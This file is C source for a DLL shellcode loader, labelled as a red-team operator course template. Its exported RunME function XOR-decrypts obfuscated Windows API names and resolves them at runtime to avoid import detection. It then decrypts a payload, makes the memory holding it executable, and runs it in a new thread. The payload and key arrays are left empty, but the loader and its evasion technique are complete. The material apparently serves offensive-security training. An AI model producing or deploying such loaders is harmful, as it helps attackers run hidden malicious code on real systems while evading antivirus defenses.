/*

 Red Team Operator course code template - DLL
 author: reenz0h (twitter: @sektor7net)

*/
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#pragma comment (lib, "user32.lib")

unsigned char calc_payload[] = { };
unsigned char virtual_alloc[] = { };
unsigned char virtual_protect[] = { };
unsigned char createthread[] = { };
unsigned char waitforsingleobject[] = { };

unsigned int calc_len = sizeof(calc_payload);
unsigned int va_len = sizeof(virtual_alloc);
unsigned int vp_len = sizeof(virtual_protect);
unsigned int ct_len = sizeof(createthread);
unsigned int wfso_len = sizeof(waitforsingleobject);

char pl_key[] = "";
char va_key[] = "";
char vp_key[] = "";
char ct_key[] = "";
char wfso_key[] = "";

LPVOID (WINAPI * pVirtualAlloc)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
BOOL (WINAPI * pVirtualProtect)(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
HANDLE (WINAPI * pCreateThread)(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, __drv_aliasesMem LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);
DWORD (WINAPI * pWaitForSingleObject)(HANDLE hHandle, DWORD dwMilliseconds);

void XOR(char * data, size_t data_len, char * key, size_t key_len) {
        int j;
        
        j = 0;
        for (int i = 0; i < data_len; i++) {
                if (j == key_len - 1) j = 0;

                data[i] = data[i] ^ key[j];
                j++;
        }
}

BOOL APIENTRY DllMain(HMODULE hModule,  DWORD  ul_reason_for_call, LPVOID lpReserved) {

    switch (ul_reason_for_call)  {
    case DLL_PROCESS_ATTACH:
    case DLL_PROCESS_DETACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
        break;
    }
    return TRUE;
}

extern "C" {
__declspec(dllexport) BOOL WINAPI RunME(void) {
	
	void * exec_mem;
	BOOL rvba;
	HANDLE thba;
    	DWORD oldprotect = 0;

        XOR((char *) virtual_alloc, va_len, va_key, sizeof(va_key));

	pVirtualAlloc = GetProcAddress(GetModuleHandle("kernel32.dll"), virtual_alloc);
	exec_mem = pVirtualAlloc(0, calc_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	
	XOR((char *) calc_payload, calc_len, pl_key, sizeof(pl_key));
	
	RtlMoveMemory(exec_mem, calc_payload, calc_len);
	
        XOR((char *) virtual_protect, vp_len, vp_key, sizeof(vp_key));

	pVirtualProtect = GetProcAddress(GetModuleHandle("kernel32.dll"), virtual_protect);
	rvba = pVirtualProtect(exec_mem, calc_len, PAGE_EXECUTE_READ, &oldprotect);

	// If all good, launch the payload
	if ( rvba != 0 ) {
		        XOR((char *) createthread, ct_len, ct_key, sizeof(ct_key));
		        pCreateThread = GetProcAddress(GetModuleHandle("kernel32.dll"), createthread);
			thba = pCreateThread(0, 0, (LPTHREAD_START_ROUTINE) exec_mem, 0, 0, 0);
		        XOR((char *) waitforsingleobject, wfso_len, wfso_key, sizeof(wfso_key));
			pWaitForSingleObject = GetProcAddress(GetModuleHandle("kernel32.dll"), waitforsingleobject);
			pWaitForSingleObject(thba, -1);
	}
	return TRUE;
	}
}
